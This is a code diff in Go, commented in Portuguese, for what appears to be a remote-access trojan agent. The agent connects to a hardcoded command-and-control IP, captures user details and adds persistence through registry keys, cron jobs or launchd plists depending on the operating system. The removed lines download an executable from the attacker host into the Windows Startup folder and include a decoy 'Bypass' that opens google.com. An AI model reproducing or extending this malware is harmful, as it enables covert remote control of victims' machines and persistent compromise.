@@ -32,25 +32,9 @@ var (
 const (
 	//Coloque aqui o IP publico para conexão
 	SERVIDOR = "200.98.129.32"
-	//SERVIDOR = "192.168.0.254"
-	PORTA = "9090"
-	url   = "https://www.google.com"
+	PORTA    = "9090"
 )
 
-func Bypass() {
-	_, err := http.Get(url)
-	if err != nil {
-		fmt.Println("Erro ao fazer a solicitação HTTP:", err)
-		return
-	}
-
-	// Abre a página do Google no navegador padrão
-	err = exec.Command("xdg-open", url).Start()
-	if err != nil {
-		fmt.Println("Erro ao abrir a página no navegador:", err)
-		return
-	}
-}
 func CapturaUser() {
 	currentUser, err := user.Current()
 	if err != nil {
@@ -69,40 +53,6 @@ func init() {
 	mensagem.AgentCWD, _ = os.Getwd()
 	mensagem.AgentID = geraID()
 }
-func IniciaJunto() error {
-	// Obter o diretório de inicialização do usuário
-	currentUser, err := user.Current()
-	if err != nil {
-		return err
-	}
-	startupDir := filepath.Join(currentUser.HomeDir, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-
-	// Baixar o arquivo
-	url := "http://200.98.129.32/agente.exe"
-	response, err := http.Get(url)
-	if err != nil {
-		return err
-	}
-	defer response.Body.Close()
-
-	// Criar o arquivo no diretório de inicialização
-	filePath := filepath.Join(startupDir, "agente.exe")
-	file, err := os.Create(filePath)
-	if err != nil {
-		return err
-	}
-	defer file.Close()
-
-	// Salvar o conteúdo do arquivo
-	_, err = io.Copy(file, response.Body)
-	if err != nil {
-		return err
-	}
-
-	fmt.Printf("Arquivo baixado e salvo com sucesso no diretório de inicialização de %s!\n", currentUser.Username)
-	return nil
-}
-
 func addRegistryKey() error {
 	currentUser, err := user.Current()
 	if err != nil {
@@ -206,12 +156,15 @@ func createCronJob() error {
 }
 
 func main() {
-	Bypass()
-	IniciaJunto()
-	DownloadDll()
-	addRegistryKey()
-	createLaunchdPlist()
-	createCronJob()
+
+	if runtime.GOOS == "windows" {
+		DownloadDll()
+		addRegistryKey()
+	} else if runtime.GOOS == "linux" {
+		createCronJob()
+	} else {
+		createLaunchdPlist()
+	}
 	log.Println("Executando Agent")
 	CapturaUser()
 	for {
